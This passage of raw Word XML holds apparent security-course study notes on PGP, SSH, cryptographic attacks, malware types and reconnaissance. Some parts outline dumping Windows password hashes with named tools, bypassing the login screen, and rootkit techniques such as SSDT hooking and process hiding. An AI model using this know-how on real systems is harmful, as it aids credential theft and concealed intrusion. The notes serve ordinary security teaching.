    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000D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Computer program to provide privacy and auth, encrypts files and applies digital signature. </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000D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It is a web of trust, easy fast (no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root ca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have to trust public)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000D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Open PGP</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000D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Standards that describe the formats for encrypted messages, keys and digital signatures;</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000D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 → name of owner, numerical values, key for encryption,algorithm, expiration data</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000D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keyring,  store public and private key.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000D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Encryption → generate symmetric key &amp; encrypt it with a public key, encrypt message with this</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000D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D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D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D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x62kxic3eng" w:id="35"/>
        <w:bookmarkEnd w:id="3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Secure Shell (SSH)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000D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protocol for data exchange between two networked devices</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000E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Create tunnels → encrypted traffic</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000E1">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="29"/>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Bypasses firewalls and services </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000E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 forwarding </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000E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Secure file transfer</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000E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sgtjqfq0xex" w:id="36"/>
        <w:bookmarkEnd w:id="3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Cryptographic Attacks</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000E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Plain text → access to plain and corresponding cipher text</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000E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Ciphertext → only cipher text</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000E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o78m6g2anv" w:id="37"/>
        <w:bookmarkEnd w:id="3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Brute force</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000E8">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="28"/>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Des length of 56 bit, insecure</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000E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ex43sipbgi0" w:id="38"/>
        <w:bookmarkEnd w:id="3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Dictionary </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000EA">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="52"/>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Most likely, symmetric key algorithms</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000E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95fn3rlshv9" w:id="39"/>
        <w:bookmarkEnd w:id="3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Rainbow Tables</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000EC">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="108"/>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Compare hashes (md5)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000E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3e7ggunsxoc" w:id="40"/>
        <w:bookmarkEnd w:id="4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Side Channel</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000EE">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="123"/>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Take into account physical. Ie time taken to perform encryption etc</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000E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ihaaak7lp9r" w:id="41"/>
        <w:bookmarkEnd w:id="4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Birthday Attacks</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000F0">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="96"/>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Discover collisions in md5 or sha1</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000F1">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F2">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F3">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F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n5rbn5782jpy" w:id="42"/>
        <w:bookmarkEnd w:id="4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Passwords</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000F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All stored in SAM (security accounts manager) → registry database file</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000F6">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11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LM hash</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000F7">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11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NT hash</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000F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 accessible while system is running</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000F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Also stored in HKEY_LOCAL_MACHINE/SAM registry [not available when running, need system]</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000F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Remotely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dumped from memory(requires admin account,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pwdump, fgdump, ophcrack,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hashdump</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0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Locally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local admin from memory if system is running , else get from sam</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000F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 </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000F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Bypass windows login,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kon boot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change windows kernel while booting, log in a sroot</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000000F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0F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09">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42etx3xrtb5" w:id="43"/>
        <w:bookmarkEnd w:id="4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Malware</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000010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qonplkchr9m" w:id="44"/>
        <w:bookmarkEnd w:id="4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Classification</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000010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Virus → copies itself NOT through vulns . ie. host moves infected file to other systems</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000010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Trojan Horse → seems to perform a function by facilitates unauthorised access</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000010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Rootkit → hide that a compromise has been done, hides processes , files etc. </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000010E">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8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Installed as drivers or kernel </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000010F">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="88"/>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Supplements other malware</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000110">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="88"/>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app level, library level, kernel level, hypervisor level, firmware level</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000111">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Bootkit → grabs os during boot </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000112">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Greyware → spyware and adware</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000113">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Dialer →  connect to high charging numbers</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000114">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:spacing w:before="200"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Botnet → collection of compromised computers running commands automatically via a command and control server</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000115">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:widowControl w:val="1"/>
        <w:spacing w:after="0" w:before="20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wozjkr98lq1" w:id="45"/>
        <w:bookmarkEnd w:id="4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Techniques Used By Malware</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000011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lisvzboc0yi" w:id="46"/>
        <w:bookmarkEnd w:id="4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Streams</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000011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Streams are a feature of NTFS file systems, not on FAT systems</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000011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instead of a file file.txt:hstream </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000011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And retrieve via &lt;</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000011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qikntg0lbrx" w:id="47"/>
        <w:bookmarkEnd w:id="4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Hooking Native API’s</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000011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SSDT, system service descriptor table</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000011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Native api resides in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ntll.dll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communicate with the kernel mode</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000011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Native api &lt;→ ssdt table ←&gt;  kernel mode  </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000011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directory query uses into NTQueryDirecortyFile, hooking means that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different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function is called instead (by modifying the ssdt table)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000011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6v78qqsn6h1" w:id="48"/>
        <w:bookmarkEnd w:id="4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Hooking IRP</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000012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Io request packets → transmit data from one component to another. Used by network interface, file system, mouse etc. Drivers</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000012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by: become a filter driver → register with the os as an attached device or driver</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000012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Hooking the function pointer </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000123">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pwyqt9rss7z" w:id="49"/>
        <w:bookmarkEnd w:id="4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Hiding a Process</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000012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Need to:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000125">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13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Hook ntopenprocess Native API ( ssdt)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000126">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="13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Hide from EPROCESS list (list of active procesS) → unlink active process links</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000127">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="130"/>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Unlink any drivers from Ps Loaded Module List</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000128">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2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y11aa2y4kt5" w:id="50"/>
        <w:bookmarkEnd w:id="5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API Hooking</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000012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IAT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import address table.  Resolve runtime dependencies. Ie  modifying the dependency link to kernell32 in the IAT table of the exe</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000012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EAT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Export address Table. Maintained in DLL’s</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000012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Inline Hooking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modify first few bytes, replace with our code modifying the IP </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001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2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2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35">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:keepNext w:val="1"/>
        <w:keepLines w:val="1"/>
        <w:widowControl w:val="1"/>
        <w:spacing w:after="0" w:before="32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xvbo8vatfmm" w:id="51"/>
        <w:bookmarkEnd w:id="5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Security</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000136">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yb147edw0ys" w:id="52"/>
        <w:bookmarkEnd w:id="5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Information Gathering</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001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138613" cy="2553471"/>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38613" cy="2553471"/>
                      </a:xfrm>
                      <a:prstGeom prst="rect"/>
                      <a:ln/>
                    </pic:spPr>
                  </pic:pic>
                </a:graphicData>
              </a:graphic>
            </wp:inline>
          </w:drawing>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="000001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Passive → not exposing our presence  </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000013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Active → interacting with a system</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000013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Mind mapping online research</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000013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Foca , get files with passwords and os from google given a key word</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000013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4kht0d9oa65m" w:id="53"/>
        <w:bookmarkEnd w:id="5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Infrastructure</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000013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 &amp; PRocesses for Enumeration </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000013E">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="9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WHOIS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tcp port 43)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000013F">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Provided by a regional internet registry</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000140">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="98"/>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Name Servers, DNS</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000141">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Provide a means to use hostnames in lieu of IP’s</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000142">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Queries produce a resource record</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000143">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Nslookup(win)/dig(nix)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nslookup domain name OR reverse lookup with -type=PTR IP (pointer records)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000144">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Zone transfers  → misconfiguration of dns server, ability to enumerate entire dns record for that zone</w:t>
        </w:r>
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:rtl w:val="0"/>
          </w:rPr>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000145">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="98"/>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w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000146">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nslookup.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000147">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="9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 search on google for subdomain enumeration</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000148">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="98"/>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14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Netblocks → range of Ip addresses, usually assigned to an ISP or gov</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000014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mfnwifmhsim" w:id="54"/>
        <w:bookmarkEnd w:id="5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Maltego</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000014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Source intelligence and forensics application</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000014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Series of transformations</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000014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DNSdumpster → discovered hosts related to a specific domain </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000014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DNSEnum→ host a record, name servers, MX Records </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000014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23zob9oc7b" w:id="55"/>
        <w:bookmarkEnd w:id="5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Scanning</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000015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Fping -A (imcp ping)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000015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w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000015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-sn (ping sweep not a port scan)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000015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However, ICMP is often is disabled on routers and firewalls. </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000015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55">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u8ailbpnhvu" w:id="56"/>
        <w:bookmarkEnd w:id="5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LAB NOTES (@2)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000156">
      <w:pPr>
        <w:widowControl w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5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Ping sweep (nmap -sn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IPRANGE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icmp requests and TCP on 80/443</w:t>
        </w:r>
      </w:ins>
    </w:p>
